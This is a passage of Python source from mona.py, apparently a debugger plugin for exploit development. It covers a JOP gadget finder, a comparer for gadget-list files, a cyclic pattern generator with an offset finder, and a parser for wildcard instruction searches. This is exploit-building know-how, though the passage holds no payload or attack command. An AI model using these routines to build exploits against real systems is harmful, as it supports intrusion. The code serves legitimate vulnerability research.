					ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
					with open(thislog, "a") as fh:
						fh.write(ptrinfo)
	thistimestamp=get_current_datetime()
	objprogressfile.write("Done (" + thistimestamp+")",progressfile)
	dbg.log("Done")
	return interestinggadgets,ropgadgets,suggestions,vplogtxt

	

#----- JOP gadget finder ----- #			
def findJOPGADGETS(modulecriteria={},criteria={},depth=6):
	"""
	Searches for jop gadgets

	Arguments:
	modulecriteria - dictionary with criteria modules need to comply with.
	                 Default settings are : ignore aslr and rebased modules
	criteria - dictionary with criteria the pointers need to comply with.
	depth - maximum number of instructions to go back
	
	Return:
	Output is written to files, containing jop gadgets and suggestions
	"""
	found_opcodes = {}
	all_opcodes = {}
	ptr_counter = 0
	
	modulestosearch = getModulesToQuery(modulecriteria)
	
	progressid=toHex(dbg.getDebuggedPid())
	progressfilename="_jop_progress_"+dbg.getDebuggedName()+"_"+progressid+".log"
	
	objprogressfile = MnLog(progressfilename)
	progressfile = objprogressfile.reset()

	dbg.log("[+] Progress will be written to %s" % progressfilename)
	dbg.log("[+] Max nr of instructions : %d" % depth)

	filesok = 0
	usefiles = False
	filestouse = []
	vplogtxt = ""
	suggestions = {}
	fast = False
	
	search = []
	

	# Make a copy: we don't want to mutate the global register order lists.
	jopregs = Registers32BitsOrder[:]
	if "esp" in jopregs:
		jopregs.remove("esp")
	if arch == 64:
		jopregs = Registers64BitsOrder[:]
		if "rsp" in jopregs:
			jopregs.remove("rsp")
		
	offsetval = 0
	
	for jreg in jopregs:
		search.append("jmp " + jreg)
		if arch == 32:
			search.append("jmp [" + jreg + "]")
			for offsetval in range(0, 40+1, 2):
				search.append("jmp [" + jreg + "+0x" + toHexByte(offsetval)+"]")

	if arch == 32:
		stackreg = "esp"
	
		search.append("jmp [%s]" % stackreg)
			
		for offsetval in range(0, 40+1, 2):
			search.append("jmp [" + stackreg + "+0x" + toHexByte(offsetval) + "]")


	dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
	for thismodule in modulestosearch:
		dbg.log("    - Querying module %s" % thismodule)
		dbg.updateLog()
		#search
		found_opcodes = searchInModule(search,thismodule,criteria)
		#merge results
		all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
	dbg.log("    - Search complete :")
			
	dbg.updateLog()
	tp = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			if usefiles:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) // 2))
				tp = tp + len(all_opcodes[endingtype]) // 2
			else:
				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
				tp = tp + len(all_opcodes[endingtype])
	global silent
	dbg.log("    - Filtering and mutating %d gadgets" % tp)
		
	dbg.updateLog()
	jopgadgets = {}
	interestinggadgets = {}

	adcnt = 0
	tc = 1
	issafeseh = False
	step = 0
	for endingtype in all_opcodes:
		if len(all_opcodes[endingtype]) > 0:
			for endingtypeptr in all_opcodes[endingtype]:
				adcnt += 1
				if usefiles:
					adcnt = adcnt - 0.5
				if adcnt > (tc*1000):
					thistimestamp=get_current_datetime()
					updatetext = "      - " + str(tc*1000) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*1000*100)/tp)+"%)"
					objprogressfile.write(updatetext.strip(),progressfile)
					dbg.log(updatetext)
					dbg.updateLog()
					tc += 1			
				#first get max backward instruction
				thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
				thisptr = thisopcode.getAddress()
				# we now have a range to mine
				startptr = thisptr

				while startptr <= endingtypeptr and startptr != 0x0:
					# get the entire chain from startptr to endingtypeptr
					thischain = ""
					msfchain = []
					thisopcodebytes = ""
					chainptr = startptr
					if isGoodGadgetPtr(startptr,criteria) and not startptr in jopgadgets and not startptr in interestinggadgets:
						# new pointer
						invalidinstr = False
						while chainptr < endingtypeptr and not invalidinstr:
							thisopcode = dbg.disasm(chainptr)
							thisinstruction = getDisasmInstruction(thisopcode)
							if isGoodJopGadgetInstr(thisinstruction) and not isGadgetEnding(thisinstruction,search):
								thischain =  thischain + " # " + thisinstruction
								msfchain.append([chainptr,thisinstruction])
								thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
								chainptr = dbg.disasmForwardAddressOnly(chainptr,1)
							else:
								invalidinstr = True
						if endingtypeptr == chainptr and startptr != chainptr and not invalidinstr:
							fullchain = thischain + " # " + endingtype
							msfchain.append([endingtypeptr,endingtype])
							thisopcode = dbg.disasm(endingtypeptr)
							thisopcodebytes = thisopcodebytes + opcodesToHex(thisopcode.getDump().lower())
							msfchain.append(["raw",thisopcodebytes])
							if isInterestingJopGadget(fullchain):					
								interestinggadgets[startptr] = fullchain
							else:
								if not fast:
									jopgadgets[startptr] = fullchain
					startptr = startptr+1
	
	thistimestamp=get_current_datetime()
	updatetext = "      - " + str(tp) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (100%)"
	objprogressfile.write(updatetext.strip(),progressfile)
	dbg.log(updatetext)
	dbg.updateLog()

	logfile = MnLog("jop.txt")
	thislog = logfile.reset()
	objprogressfile.write("Enumerating gadgets",progressfile)
	dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
	logfile.write("Interesting gadgets",thislog)
	logfile.write("-------------------",thislog)
	dbg.updateLog()
	arrtowrite = ""
	try:
		with open(thislog, "a") as fh:
			arrtowrite = ""
			for gadget in interestinggadgets:
					ptrx = MnPointer(gadget)
					modname = ptrx.belongsTo()
					modinfo = MnModule(modname)
					ptrinfo = "%s" % (PTR_PRINT % gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
					arrtowrite += ptrinfo
			objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
			fh.writelines(arrtowrite)
	except:
		pass				

	return interestinggadgets,jopgadgets,suggestions,vplogtxt	
	

	#----- File compare ----- #

def findFILECOMPARISON(modulecriteria={},criteria={},allfiles=[],tomatch="",checkstrict=True,rangeval=0,fast=False):
	"""
	Compares two or more files generated with mona.py and lists the entries that have been found in all files

	Arguments:
	modulecriteria =  not used
	criteria = not used
	allfiles = array with filenames to compare
	tomatch = variable containing a string each line should contain
	checkstrict = Boolean, when set to True, both the pointer and the instructions should be exactly the same
	
	Return:
	File containing all matching pointers
	"""
	dbg.setStatusBar("Comparing files...")	
	dbg.updateLog()

	filenotfound = False
	for fcnt in xrange(len(allfiles)):
		fname = allfiles[fcnt]
		fname = fname.strip()
		if os.path.exists(fname):
			dbg.log("     - %s" % (allfiles[fcnt]))
		else:
			dbg.log("     ** %s : Does not exist !" % allfiles[fcnt], highlight=1)
			filenotfound = True
	if filenotfound:
		return
	objcomparefile = MnLog("filecompare.txt")
	comparefile = objcomparefile.reset(skipModuleTable=True)
	objcomparefilenot = MnLog("filecompare_not.txt")
	comparefilenot = objcomparefilenot.reset(skipModuleTable=True)
	objcomparefilenot.write("Source files:",comparefilenot)
	for fcnt in xrange(len(allfiles)):
		objcomparefile.write(" - " + str(fcnt+1)+". "+allfiles[fcnt],comparefile)
		objcomparefilenot.write(" - " + str(fcnt+1)+". "+allfiles[fcnt],comparefilenot)
	objcomparefile.write("",comparefile)
	objcomparefile.write("Pointers found :",comparefile)
	objcomparefile.write("----------------",comparefile)
	objcomparefilenot.write("",comparefilenot)
	objcomparefilenot.write("Pointers not found :",comparefilenot)
	objcomparefilenot.write("-------------------",comparefilenot)

	# transform the files into dictionaries
	dbg.log("[+] Reading input files ...")
	all_input_files = {}
	all_pointers = {}
	fcnt = 0
	for thisfile in allfiles:
		filedata = {}
		content = []
		with open(thisfile,"rb") as inputfile:
			content = inputfile.readlines()
		pointerlist = []
		for thisLine in content:
			refpointer,instr = splitToPtrInstr(thisLine)
			dbgp("Read line with pointer %s and instruction %s" % (PTR_PRINT % refpointer,instr))
			# Handle both bytes and string types
			if isinstance(instr, bytes):
				instr = instr.replace(b'\n', b'').replace(b'\r', b'').strip(b":")
				instr = instr.decode('utf-8', errors='replace')
			else:
				instr = instr.replace('\n','').replace('\r','').strip(":")
			if refpointer != -1 and not refpointer in filedata:
				filedata[refpointer] = instr
				pointerlist.append(refpointer)
		all_input_files[fcnt] = filedata
		all_pointers[fcnt] = pointerlist
		fcnt += 1
	# select smallest one
	dbg.log("[+] Finding shortest array, to use as the reference")
	shortestarray = 0
	shortestlen = 0
	for inputfile in all_input_files:
		if (len(all_input_files[inputfile]) < shortestlen) or (shortestlen == 0):
			shortestlen = len(all_input_files[inputfile])
			shortestarray = inputfile
	dbg.log("    Reference file: %s (%d pointers)" % (allfiles[shortestarray],shortestlen))

	fileorder = []
	fileorder.append(shortestarray)
	cnt = 0
	while cnt <= len(all_input_files):
		if not cnt in fileorder:
			fileorder.append(cnt)
		cnt += 1
	remaining = []
	fulllist = []
	if rangeval == 0:
		dbg.log("[+] Starting compare, please wait...")
		dbg.updateLog()		
		fcnt =  1
		remaining = all_pointers[shortestarray]
		fulllist = all_pointers[shortestarray]
		while fcnt < len(fileorder)-1 and len(remaining) > 0:
			dbg.log("    Comparing %d reference pointers with %s" % (len(remaining),allfiles[fileorder[fcnt]]))
			remaining = list(set(remaining).intersection(set(all_pointers[fileorder[fcnt]])))
			fulllist = list(set(fulllist).union(set(all_pointers[fileorder[fcnt]])))
			fcnt += 1
	else:
		dbg.log("[+] Exploding reference list with values within range")
		dbg.updateLog()
		# create first reference list with ALL pointers within the range
		allrefptr = []
		reflist = all_pointers[shortestarray]
		for refptr in reflist:
			start_range = refptr - rangeval
			if start_range < 0:
				start_range = 0
			end_range = refptr + rangeval
			if start_range > end_range:
				tmp = start_range
				start_range = end_range
				end_range = tmp
			while start_range <= end_range:
				if not start_range in allrefptr:
					allrefptr.append(start_range)
				start_range += 1
		# do normal intersection
		dbg.log("[+] Starting compare, please wait...")
		dbg.updateLog()		
		s_remaining = allrefptr
		s_fulllist = allrefptr
		fcnt = 1
		while fcnt < len(fileorder)-1 and len(s_remaining) > 0:
			s_remaining = list(set(s_remaining).intersection(set(all_pointers[fileorder[fcnt]])))
			s_fulllist = list(set(s_fulllist).union(set(all_pointers[fileorder[fcnt]])))
			fcnt += 1
		for s in s_remaining:
			if not s in remaining:
				remaining.append(s)
		for s in s_fulllist:
			if not s in fulllist:
				fulllist.append(s)

	nonmatching = list(set(fulllist) - set(remaining))
	dbg.log("    Total nr of unique pointers : %d" % len(fulllist))
	dbg.log("    Nr of matching pointers before filtering : %d" % len(remaining))
	dbg.log("    Nr of non-matching pointers before filtering : %d" % len(nonmatching))

	dbg.log("[+] Transforming results into output...")
	outputlines = ""
	outputlines_not = ""
	# start building output
	remaining.sort()
	for remptr in remaining:
		if fast:
			outputlines += "%s\n" % (PTR_PRINT % remptr)
		else:
			thisinstr = all_input_files[shortestarray][remptr]
			include = True
			if checkstrict:
				# check if all entries are the same
				fcnt = 1
				while (fcnt < len(fileorder)-1) and include:
					if thisinstr != all_input_files[fileorder[fcnt]][remptr]:
						include = False
					fcnt += 1
			else:
				include = True
			if include and (tomatch == "" or tomatch in thisinstr):
				outputlines += "%s : %s\n" % (PTR_PRINT % remptr,thisinstr)

	for nonptr in nonmatching:
		if fast:
			outputlines_not += "%s\n" % (PTR_PRINT % nonptr)
		else:
			thisinstr = ""
			if nonptr in all_input_files[shortestarray]:
				thisinstr = all_input_files[shortestarray][nonptr]
			outputlines_not += "File(%d) %s : %s\n" % (shortestarray,(PTR_PRINT % nonptr),thisinstr)
			for fileindex in all_input_files:
				if fileindex != shortestarray:
					these_entries = all_input_files[fileindex]
					if nonptr in these_entries:
						thisinstr = these_entries[nonptr]
						outputlines_not += "   File (%d). %s\n" % (fileindex,thisinstr)
					else:
						outputlines_not += "   File (%d). Entry not found \n" % fileindex

	dbg.log("[+] Writing output to files")
	objcomparefile.write(outputlines, comparefile)
	objcomparefilenot.write(outputlines_not, comparefilenot)
	nrmatching = len(outputlines.split("\n")) - 1
	dbg.log("    Wrote %d matching pointers to file" % nrmatching)

	dbg.log("[+] Done.")
	return



#------------------#
# Cyclic pattern   #
#------------------#	

def createPattern(size,args={}):
	"""
	Create a cyclic (metasploit) pattern of a given size
	
	Arguments:
	size - value indicating desired length of the pattern
	       if value is > 20280, the pattern will repeat itself until it reaches desired length
		   
	Return:
	string containing the cyclic pattern
	"""
	char1="ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	char2="abcdefghijklmnopqrstuvwxyz"
	char3="0123456789"

	if "extended" in args:
		char3 += ",.;+=-_!&()#@({})[]%"	# ascii, 'filename' friendly
	
	if "c1" in args and args["c1"] != "":
		char1 = args["c1"]
	if "c2" in args and args["c2"] != "":
		char2 = args["c2"]
	if "c3" in args and args["c3"] != "":
		char3 = args["c3"]
			
	if not silent:
		if not "extended" in args and size > 20280 and (len(char1) <= 26 or len(char2) <= 26 or len(char3) <= 10):
			msg = "** You have asked to create a pattern > 20280 bytes, but with the current settings\n"
			msg += "the pattern generator can't create a pattern of " + str(size) + " bytes. As a result,\n"
			msg += "the pattern will be repeated for " + str(size-20280)+" bytes until it reaches a length of " + str(size) + " bytes.\n"
			msg += "If you want a unique pattern larger than 20280 bytes, please either use the -extended option\n"
			msg += "or extend one of the 3 charsets using options -c1, -c2 and/or -c3 **\n"
			dbg.logLines(msg,highlight=1)
			
	
	pattern = []
	max = int(size)
	while len(pattern) < max:
		for ch1 in char1:
			for ch2 in char2:
				for ch3 in char3:
					if len(pattern) < max:
						pattern.append(ch1)

					if len(pattern) < max:
						pattern.append(ch2)

					if len(pattern) < max:
						pattern.append(ch3)

	pattern = "".join(pattern)
	return pattern



def findOffsetInPattern(searchpat,size=20280,args = {}):
	"""
	Check if a given searchpattern can be found in a cyclic pattern
	
	Arguments:
	searchpat : the ascii value or hexstr to search for
	
	Return:
	entries in the log window, indicating if the pattern was found and at what position
	"""
	mspattern=""


	searchpats = []
	modes = []
	modes.append("normal")
	modes.append("upper")
	modes.append("lower")
	extratext = ""

	patsize=int(size)
	
	if patsize == -1:
		size = 500000
		patsize = size
	
	global silent
	oldsilent=silent
	
	for mode in modes:
		silent=oldsilent		
		if mode == "normal":
			silent=True
			mspattern=createPattern(size,args)
			silent=oldsilent
			extratext = " "
		elif mode == "upper":
			silent=True
			mspattern=createPattern(size,args).upper()
			silent=oldsilent
			extratext = " (uppercase) "
		elif mode == "lower":
			silent=True
			mspattern=createPattern(size,args).lower()
			silent=oldsilent
			extratext = " (lowercase) "
		if len(searchpat)==3:
			#register ?
			searchpat = searchpat.lower()
			regs = getRegisters()
			if searchpat in regs:
				searchpat = "0x" + toHex(regs[searchpat])
		if len(searchpat)==4:
			ascipat=searchpat
			if not silent:
				dbg.log("Looking for %s in pattern of %d bytes" % (ascipat,patsize))
			if ascipat in mspattern:
				patpos = mspattern.find(ascipat)
				if not silent:
					dbg.log(" - Pattern %s found in cyclic pattern%sat position %d" % (ascipat,extratext,patpos),highlight=1)
			else:
				#reversed ?
				ascipat_r = ascipat[3]+ascipat[2]+ascipat[1]+ascipat[0]
				if ascipat_r in mspattern:
					patpos = mspattern.find(ascipat_r)
					if not silent:
						dbg.log(" - Pattern %s (%s reversed) found in cyclic pattern%sat position %d" % (ascipat_r,ascipat,extratext,patpos),highlight=1)			
				else:
					if not silent:
						dbg.log(" - Pattern %s not found in cyclic pattern%s" % (ascipat_r,extratext))
		if len(searchpat)==8:
				searchpat="0x"+searchpat
		if len(searchpat)==10:
				hexpat=searchpat
				ascipat3 = toAscii(hexpat[8]+hexpat[9])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[2]+hexpat[3])
				if not silent:
					dbg.log("Looking for %s in pattern of %d bytes" % (ascipat3,patsize))
				if ascipat3 in mspattern:
					patpos = mspattern.find(ascipat3)
					if not silent:
						dbg.log(" - Pattern %s (%s) found in cyclic pattern%sat position %d" % (ascipat3,hexpat,extratext,patpos),highlight=1)
				else:
					#maybe it's reversed
					ascipat4=toAscii(hexpat[2]+hexpat[3])+toAscii(hexpat[4]+hexpat[5])+toAscii(hexpat[6]+hexpat[7])+toAscii(hexpat[8]+hexpat[9])
					if not silent:
						dbg.log("Looking for %s in pattern of %d bytes" % (ascipat4,patsize))
					if ascipat4 in mspattern:
						patpos = mspattern.find(ascipat4)
						if not silent:
							dbg.log(" - Pattern %s (%s reversed) found in cyclic pattern%sat position %d" % (ascipat4,hexpat,extratext,patpos),highlight=1)
					else:
						if not silent:
							dbg.log(" - Pattern %s not found in cyclic pattern%s " % (ascipat4,extratext))



def parseInstructionWildcardSearch(userinput, mindistance, maxdistance):
    """
    Parse a user-provided instruction search string for wildcard-aware instruction matching.

    Expected input format
    ---------------------
    Instructions are separated with '#'

    Examples:
        "PUSH EBX#POP EAX"
        "PUSH EBX#*#MOV EAX,R32#JMP ESP"
        "MOV RAX,R64#*#JMP RSP#*"
        "MOV EAX,[EBP-N]#JMP ESP"
        "MOV EAX,[EBP+N]#JMP ESP"
        "MOV EAX,[EBP-N4:40]#JMP ESP"
        "MOV EAX,[EBP+N0x4:0x40]#JMP ESP"
        "ADD ESP,IMM"
        "ADD ESP,IMM4:40"
        "ADD ESP,IMM0x4:0x40"
        "*#DEC EAX#*#CALL ESP"
        "#DEC EAX#CALL ESP"

    Supported special tokens
    ------------------------
    *       = wildcard instruction placeholder
    R32     = placeholder for any 32-bit register
    R64     = placeholder for any 64-bit register

    -N      = placeholder for any negative offset in the global range
              mindistance..maxdistance
    +N      = placeholder for any positive offset in the global range
              mindistance..maxdistance
    -Nx:y   = placeholder for any negative offset in the specific range x..y
              for that occurrence only
    +Nx:y   = placeholder for any positive offset in the specific range x..y
              for that occurrence only

    IMM     = placeholder for any immediate value in the global range
              mindistance..maxdistance
    IMMx:y  = placeholder for any immediate value in the specific range x..y
              for that occurrence only

              Examples:
                  -n4:40
                  +n4:40
                  -n0x4:0x40
                  +n0x4:0x40
                  imm4:40
                  imm0x4:0x40
                  imm4:0x40

              If a bound starts with 0x, it is interpreted as hex.
              Otherwise it is interpreted as decimal.

    Notes
    -----
    - Leading empty fragments and leading wildcards are removed until the pattern
      starts with a real instruction.
    - Trailing wildcards are removed.
    - All stored instructions are normalized to lowercase.
    - Expanded register replacements are also forced to lowercase.
    - Expanded offsets and immediates are emitted as lowercase hex with 0x prefix.
    - If, after normalization, no real instruction remains, the function returns
      an empty result with valid=False.
    """

    result = {
        "original": userinput,
        "normalized": "",
        "parts": [],
        "first_patterns": [],
        "has_wildcards": False,
        "first_has_r32": False,
        "first_has_r64": False,
        "first_has_offset": False,
        "first_has_imm": False,
        "valid": False,
        "error": ""
    }

    if userinput is None:
        result["error"] = "no input provided"
        return result

    try:
        searchtxt = str(userinput).strip()
    except:
        try:
            searchtxt = userinput.strip()
        except:
            searchtxt = ""

    if not searchtxt:
        result["error"] = "empty input"
        return result

    # normalize input
    searchtxt = searchtxt.replace("\r", "").replace("\n", "")
    while "##" in searchtxt:
        searchtxt = searchtxt.replace("##", "#")

    # split into fragments and normalize to lowercase
    rawparts = searchtxt.split("#")
    cleaned = []
    for p in rawparts:
        p = p.strip().lower()
        if p != "":
            cleaned.append(p)

    # remove leading wildcards until the first real instruction
    while len(cleaned) > 0 and cleaned[0] == "*":
        cleaned.pop(0)

    # remove trailing wildcards
    while len(cleaned) > 0 and cleaned[-1] == "*":
        cleaned.pop()

    # must contain at least one real instruction
    has_real_instruction = False
    for p in cleaned:
        if p != "*":
            has_real_instruction = True
            break

    if not has_real_instruction:
        result["error"] = "pattern does not contain a real instruction"
        return result

    result["normalized"] = "#".join(cleaned)

    # build parsed parts
    for p in cleaned:
        if p == "*":
            result["has_wildcards"] = True
            result["parts"].append({
                "type": "wildcard",
                "text": "*"
            })
        else:
            result["parts"].append({
                "type": "instruction",
                "text": p
            })

    # build the first contiguous block of instructions
    first_block = []
    for entry in result["parts"]:
        if entry["type"] == "wildcard":
            break
        first_block.append(entry["text"])

    if len(first_block) == 0:
        result["error"] = "pattern does not start with a real instruction"
        return result

    def parse_num_value(numtxt):
        """
        Parse a numeric bound.
        0x-prefixed values are hex, everything else is decimal.
        """
        numtxt = str(numtxt).strip().lower()
        if numtxt.startswith("0x"):
            return int(numtxt, 16)
        return int(numtxt, 10)

    def find_offset_token(instr):
        """
        Find the next offset token in an instruction.

        Supported forms:
            -n
            +n
            -n4:40
            +n4:40
            -n0x4:0x40
            +n0x4:0x40
            -n4:0x40
            +n4:0x40

        Returns:
            (startpos, endpos, sign, minval, maxval)
        or
            None
        """
        instr_l = instr.lower()

        idx_minus = instr_l.find("-n")
        idx_plus = instr_l.find("+n")

        if idx_minus < 0 and idx_plus < 0:
            return None

        if idx_minus < 0:
            idx = idx_plus
            sign = "+"
        elif idx_plus < 0:
            idx = idx_minus
            sign = "-"
        else:
            if idx_minus < idx_plus:
                idx = idx_minus
                sign = "-"
            else:
                idx = idx_plus
                sign = "+"

        # plain +/-n using global min/max
        if idx + 2 >= len(instr_l):
            return (idx, idx + 2, sign, int(mindistance), int(maxdistance))

        pos = idx + 2
        nextch = instr_l[pos]

        # if next char is not a digit, treat as plain +/-n
        # note: 0x starts with '0', so digit check covers that too
        if not nextch.isdigit():
            return (idx, idx + 2, sign, int(mindistance), int(maxdistance))

        # try to parse attached range
        first_start = pos
        if instr_l[pos:pos+2] == "0x":
            pos += 2
            while pos < len(instr_l) and instr_l[pos] in "0123456789abcdef":
                pos += 1
        else:
            while pos < len(instr_l) and instr_l[pos].isdigit():
                pos += 1

        first_txt = instr_l[first_start:pos]
        if first_txt == "":
            return (idx, idx + 2, sign, int(mindistance), int(maxdistance))

        # must have colon for per-token range
        if pos >= len(instr_l) or instr_l[pos] != ":":
            return (idx, idx + 2, sign, int(mindistance), int(maxdistance))

        pos += 1

        # parse second bound
        second_start = pos
        if pos < len(instr_l) and instr_l[pos:pos+2] == "0x":
            pos += 2
            while pos < len(instr_l) and instr_l[pos] in "0123456789abcdef":
                pos += 1
        else:
            while pos < len(instr_l) and instr_l[pos].isdigit():
                pos += 1

        second_txt = instr_l[second_start:pos]
        if second_txt == "":
            return None

        try:
            minval = parse_num_value(first_txt)
            maxval = parse_num_value(second_txt)
        except:
            return None

        return (idx, pos, sign, minval, maxval)

    def find_imm_token(instr):
        """
        Find the next immediate token in an instruction.

        Supported forms:
            imm
            imm4:40
            imm0x4:0x40
            imm4:0x40
            imm0x4:40

        Returns:
            (startpos, endpos, minval, maxval)
        or
            None
        """
        instr_l = instr.lower()
        idx = instr_l.find("imm")
        if idx < 0:
            return None

        # plain imm using global min/max
        if idx + 3 >= len(instr_l):
            return (idx, idx + 3, int(mindistance), int(maxdistance))

        pos = idx + 3
        nextch = instr_l[pos]

        # if next char is not a digit, treat as plain imm
        # note: 0x starts with '0', so digit check covers that too
        if not nextch.isdigit():
            return (idx, idx + 3, int(mindistance), int(maxdistance))

        # try to parse attached range
        first_start = pos
        if instr_l[pos:pos+2] == "0x":
            pos += 2
            while pos < len(instr_l) and instr_l[pos] in "0123456789abcdef":
                pos += 1
        else:
            while pos < len(instr_l) and instr_l[pos].isdigit():
                pos += 1

        first_txt = instr_l[first_start:pos]
        if first_txt == "":
            return (idx, idx + 3, int(mindistance), int(maxdistance))

        # must have colon for per-token range
        if pos >= len(instr_l) or instr_l[pos] != ":":
            return (idx, idx + 3, int(mindistance), int(maxdistance))

        pos += 1

        # parse second bound
        second_start = pos
        if pos < len(instr_l) and instr_l[pos:pos+2] == "0x":
            pos += 2
            while pos < len(instr_l) and instr_l[pos] in "0123456789abcdef":
                pos += 1
        else:
            while pos < len(instr_l) and instr_l[pos].isdigit():
                pos += 1

        second_txt = instr_l[second_start:pos]
        if second_txt == "":
            return None

        try:
            minval = parse_num_value(first_txt)
            maxval = parse_num_value(second_txt)
        except:
            return None

        return (idx, pos, minval, maxval)

    def expand_instruction(instr):
        """
        Expand one instruction for:
            - r32
            - r64
            - -n / +n
            - per-token offset ranges such as -n4:40 or +n0x4:0x40
            - imm
            - per-token immediate ranges such as imm4:40 or imm0x4:0x40

        Generates all combinations if multiple placeholders are present.
        Everything returned is lowercase.
        """
        patterns = [instr.lower()]

        # expand all r32 occurrences
        if "r32" in instr.lower():
            tmp = []
            for pat in patterns:
                count = pat.count("r32")
                expanded = [pat]
                for _ in range(count):
                    newexpanded = []
                    for e in expanded:
                        pos = e.find("r32")
                        if pos >= 0:
                            for reg in Registers32BitsOrder:
                                reg_l = str(reg).strip().lower()
                                newexpanded.append(e[:pos] + reg_l + e[pos+3:])
                        else:
                            newexpanded.append(e)
                    expanded = newexpanded
                tmp.extend(expanded)
            patterns = tmp

        # expand all r64 occurrences
        if "r64" in instr.lower():
            tmp = []
            for pat in patterns:
                count = pat.count("r64")
                expanded = [pat]
                for _ in range(count):
                    newexpanded = []
                    for e in expanded:
                        pos = e.find("r64")
                        if pos >= 0:
                            for reg in Registers64BitsOrder:
                                reg_l = str(reg).strip().lower()
                                newexpanded.append(e[:pos] + reg_l + e[pos+3:])
                        else:
                            newexpanded.append(e)
                    expanded = newexpanded
                tmp.extend(expanded)
            patterns = tmp

        # expand all offset occurrences
        while True:
            still_has_offset = False
            tmp = []

            for pat in patterns:
                tokeninfo = find_offset_token(pat)
                if tokeninfo is None:
                    tmp.append(pat)
                    continue

                still_has_offset = True
                startpos, endpos, sign, minval, maxval = tokeninfo

                # normalize bounds if user gave them reversed
                if minval > maxval:
                    minval, maxval = maxval, minval

                for dist in range(int(minval), int(maxval) + 1):
                    tmp.append(pat[:startpos] + ("%s0x%x" % (sign, dist)) + pat[endpos:])

            patterns = tmp

            if not still_has_offset:
                break

        # expand all immediate occurrences
        while True:
            still_has_imm = False
            tmp = []

            for pat in patterns:
                tokeninfo = find_imm_token(pat)
                if tokeninfo is None:
                    tmp.append(pat)
                    continue

                still_has_imm = True
                startpos, endpos, minval, maxval = tokeninfo

                # normalize bounds if user gave them reversed
                if minval > maxval:
                    minval, maxval = maxval, minval

                for dist in range(int(minval), int(maxval) + 1):
                    tmp.append(pat[:startpos] + ("0x%x" % dist) + pat[endpos:])

            patterns = tmp

            if not still_has_imm:
                break

        # force lowercase and dedupe while preserving order
        out = []
        seen_local = {}
        for p in patterns:
            p = p.lower()
            if p not in seen_local:
                seen_local[p] = True
                out.append(p)
        return out

    # remember whether the first block contains placeholders
    for instr in first_block:
        if "r32" in instr:
            result["first_has_r32"] = True
        if "r64" in instr:
            result["first_has_r64"] = True
        if "-n" in instr or "+n" in instr:
            result["first_has_offset"] = True
        if "imm" in instr:
            result["first_has_imm"] = True

    # expand each instruction in the first block separately,
    # then create the cross-product as arrays of instructions
    expanded_per_instruction = []
    for instr in first_block:
        expanded_per_instruction.append(expand_instruction(instr))

    combined = [[]]
    for instr_list in expanded_per_instruction:
        newcombined = []
        for base in combined:
            for variant in instr_list:
                newcombined.append(base + [variant.lower()])
        combined = newcombined

    # deduplicate while preserving order
    seen = {}
    for pat in combined:
        key = ";".join(pat).lower()
        if key not in seen:
            seen[key] = True
            result["first_patterns"].append([x.lower() for x in pat])

    if len(result["first_patterns"]) == 0:
        result["error"] = "could not build first search patterns"
        return result

    result["valid"] = True
    return result


def doesForwardDisasmMatch(parsed, first_pattern_flat, thisdisam):
	"""
	Check whether the current forward disassembly matches the full parsed search,
	starting from a specific already-matched first_pattern_flat key.

	Parameters
	----------
	parsed : dict
		Output from parseInstructionWildcardSearch()

	first_pattern_flat : str
		Flattened first pattern key, for example:
			"push ebx;jmp esp"
			"dec eax"
			"mov eax,ecx;jmp esp"

	thisdisam : str
		Forward disassembly output, one instruction per line

	Returns
	-------
	(matched, matched_sequence)

		matched : bool
			True if the full pattern matched

		matched_sequence : list
			The full matched instruction sequence as a list of strings,
			including instructions consumed by wildcard gaps
	"""

	if not parsed:
		return False, []

	if not first_pattern_flat:
		return False, []

	if thisdisam is None:
		thisdisam = ""

	# normalize current first pattern key into a list of instructions
	first_pattern = []
	for item in first_pattern_flat.split(";"):
		item = normalizeInstructionText(item)
		if item != "":
			first_pattern.append(item)

	if len(first_pattern) == 0:
		return False, []

	# normalize parsed parts
	full_parts = parsed.get("parts", [])
	if len(full_parts) == 0:
		return False, []

	# count total number of actual instructions in the full pattern
	total_instruction_count = 0
	has_wildcards = False
	for entry in full_parts:
		if entry["type"] == "instruction":
			total_instruction_count += 1
		elif entry["type"] == "wildcard":
			has_wildcards = True

	# if the first pattern already covers the entire search, then we're done
	if (not has_wildcards) and (len(first_pattern) == total_instruction_count):
		return True, list(first_pattern)

	# build the original first block from parsed
	# (the consecutive instructions from the start until first wildcard)
	first_block = []
	for entry in full_parts:
		if entry["type"] == "wildcard":
			break
		first_block.append(normalizeInstructionText(entry["text"]))

	# remove the first block from the full pattern to get remaining parts
	remaining_parts = []
	skipped = 0
	for entry in full_parts:
		if entry["type"] == "instruction" and skipped < len(first_block):
			skipped += 1
			continue
		remaining_parts.append({
			"type": entry["type"],
			"text": normalizeInstructionText(entry["text"])
		})

	if len(remaining_parts) == 0:
		return True, list(first_pattern)

	disasm_lines = []
	for line in thisdisam.replace("\r", "").split("\n"):
		line = normalizeInstructionText(line)
		if line != "":
			if "???" in line:
				return False, []
	
			disasm_lines.append(line)

	if len(disasm_lines) == 0:
		return False, []


	# The forward disassembly must start with the selected first pattern.
	# If not, this pointer does not belong to this start-instruction variant.
	pos = 0
	if len(disasm_lines) < len(first_pattern):
		return False, []

	for i in range(len(first_pattern)):
		if disasm_lines[i] != first_pattern[i]:
			return False, []

	pos = len(first_pattern)

	def instructionMatches(pattern_instr, disasm_instr):
